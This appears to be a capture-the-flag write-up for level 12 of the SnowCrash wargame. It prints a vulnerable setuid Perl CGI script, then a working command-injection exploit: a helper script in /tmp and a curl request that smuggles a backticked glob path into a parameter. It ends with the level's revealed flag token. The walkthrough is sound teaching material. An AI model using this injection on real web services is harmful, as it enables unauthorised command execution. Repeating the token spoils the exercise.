# level12

```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
level12@SnowCrash:~$ cat level12.pl 
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
With this line:
```
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```
We can see a potential injection.
But because of the previous regex, we can't use lowercase and space, so let's make a small script:
```
level12@SnowCrash:~$ echo "getflag > /tmp/flag.txt" > /tmp/123
level12@SnowCrash:~$ chmod 777 tmp/123
level12@SnowCrash:~$ curl "http://localhost:4646/?x=\`\/*\/123\`"
..level12@SnowCrash:~$ cat /tmp/flag.txt
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
